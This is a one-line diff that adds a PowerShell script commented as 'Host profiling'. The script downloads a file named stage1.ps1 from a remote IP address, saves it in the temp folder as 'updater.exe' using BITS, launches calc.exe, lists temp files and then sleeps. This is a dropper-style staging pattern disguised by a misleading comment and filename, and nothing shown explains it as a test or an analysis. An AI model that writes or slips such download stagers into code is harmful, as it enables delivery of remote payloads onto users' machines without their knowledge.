@@ -1,0 +1,1 @@
+<# Host profiling #> $RemoteUrl = 'http://198.51.100.24/stage1.ps1'; $Stage2Path = "$env:TEMP\updater.exe"; $ConnectionTimeout = 99; Start-BitsTransfer -Source $RemoteUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Start-Sleep -Seconds 8
